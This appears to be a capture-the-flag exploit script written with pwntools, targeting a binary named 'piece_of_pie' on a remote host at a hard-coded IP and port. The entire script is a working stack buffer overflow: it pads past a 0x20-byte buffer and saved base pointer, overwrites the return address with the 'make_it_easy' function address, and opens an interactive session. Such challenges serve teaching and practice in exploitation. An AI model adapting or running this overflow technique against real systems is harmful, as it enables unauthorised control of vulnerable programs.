from pwn import *

r = remote('141.85.224.106', 31339)

file = ELF('piece_of_pie')
buffer_size = 0x20
old_rpb_size = 0x8
make_it_easy_address = file.symbols['make_it_easy']

payload = b'A' * (buffer_size + old_rpb_size) + p64(make_it_easy_address)

r.sendline(payload)
r.interactive()
